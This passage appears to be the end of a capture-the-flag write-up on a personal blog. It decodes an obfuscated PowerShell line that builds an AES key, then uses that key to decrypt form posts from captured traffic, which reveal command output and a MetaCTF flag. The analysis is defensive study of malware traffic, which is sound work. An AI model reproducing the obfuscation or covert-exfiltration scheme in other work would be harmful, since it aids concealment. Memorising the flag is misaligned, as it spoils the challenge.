+<pre data-lang="ps" style="background-color:#2b303b;color:#c0c5ce;" class="language-ps "><code class="language-ps" data-lang="ps"><span>${VP`gN`g`cq0KcY`j3O`oP22`JR}   = (&quot;{1}{5}{2}{6}{4}{7}{3}{0}&quot;-f &#39;SU=&#39;,&#39;rn&#39;,&#39;VK5&#39;,&#39;dMoH&#39;,&#39;SOhIsUcaMOg4OL8+jCoH&#39;,&#39;17r&#39;,&#39;zsx&#39;,&#39;FYO1f+&#39;)
+</span></code></pre>
+<p>…which, thankfully, translates to:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">PS</span><span> /&gt; (&quot;</span><span style="color:#a3be8c;">{1}{5}{2}{6}{4}{7}{3}{0}</span><span>&quot;-f &#39;</span><span style="color:#a3be8c;">SU=</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">rn</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">VK5</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">dMoH</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">SOhIsUcaMOg4OL8+jCoH</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">17r</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">zsx</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">FYO1f+</span><span>&#39;)
+</span><span style="color:#bf616a;">rn17rVK5zsxSOhIsUcaMOg4OL8+jCoHFYO1f+dMoHSU
+</span></code></pre>
+<p>There's an AES key which is encrypting…what exactly?</p>
+<p>Dumping <em>all</em> the HTTP objects reveals a series of HTTP forms, the first of
+which is:</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>result=rbqA0td2aIZzzE4Q5LYitDDQcpMz%2FgSbMWbTceiStH3ZK8VvGQxF%2BOc7%2Fp2PSgDw
+</span></code></pre>
+<p>After a <em>lot</em> of tinkering with CyberChef:</p>
+<ul>
+<li>stripping the form-field prefix</li>
+<li>URL-decoding the input</li>
+<li>AES decrypting it (with the key as both key and IV)</li>
+<li>dropping the first 16 bytes</li>
+</ul>
+<p>…the final payload being:</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>rbqA0td2aIZzzE4Q5LYitDDQcpMz%2FgSbMWbTceiStH3ZK8VvGQxF%2BOc7%2Fp2PSgDw
+</span><span>oL%2FlVfK65Jw4qEiwQGpqhX8OEFEgtkKe%2FN9JA85y7Ur%2BiXZy1QipEYrMYARwm3hNEeIBhGkrQk5ypfdZQ51lPE4Bsn7RNiD6mrzzFd%2FJfgSceATcyB8kxAs0xrvOfTYW
+</span><span>I5liQ%2FBaSNMb1PhIVz8LMltNpCrmF4ThvykJwL0CKa8%3D
+</span><span>I4xR%2BpGs07nJ6IyqZSzTH%2FABiKzvZac2UYjjj5ZpOMdMQdV1LYoOCeBniQKjwsSNxLmqodg1ZbJ%2FQ9vErtoMxfMvMSJ6fsAcP4myqxD%2FLMjANpm9XPp9LdNjU9w3Stpm
+</span><span>wRMk5d%2FagURzTFrvU4E3Y2TJBuPKr9hdyoxzy59a3WQ%3D
+</span><span>OvY2N3B4gzO%2FYIT6Kjy9%2Bp9EhFmCVEYXl3AD4qHWNbw8T7hSq%2F5PTiKmB8nSN8%2BgtDy4hOIZwOWN8Emz%2BiiIM7GBivi%2F0hmfREPF%2BrWutMGCGM%2Bxfe36h3AG
+</span></code></pre>
+<p>…that decrypts to:</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>VALID desktop\ieuser
+</span><span>
+</span><span>         C ±®WvYÇRÀLÉ/òwÄVALID 
+</span><span>Path                   
+</span><span>----                   
+</span><span>C:\Users\IEUser\DesktoÝ§êb*×+²÷¾&quot;VALID 
+</span><span>         KùÕW\YßÍÜÄÆ&amp;VALID 
+</span><span>camuduon69.ps1 : The term &#39;camuduon69.ps1&#39; is not recognized as the name 6ãÅ}n5+pE|VALID 
+</span><span>         AU6¾ãX5ábAVALID MetaCTF
+</span><span>4nh_k0_4n_mun9_9c9f6732d87c6d0f1625b4d73639f34d
+</span><span>o´Ç6û&#39;;þ£o&amp;
+</span></code></pre>
+<p>…which is kinda garbage but kinda discernable at the end there:</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>MetaCTF{4nh_k0_4n_mun9_9c9f6732d87c6d0f1625b4d73639f34d}
+</span></code></pre>
+
+
+        </main>
+        
+        <footer class="footer py-1 bg-light">
+    <div class="container text-end">
+        <small class="text-muted">© 2024 PsypherPunk</small>
+    </div>
+</footer>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+    </body>
+</html>
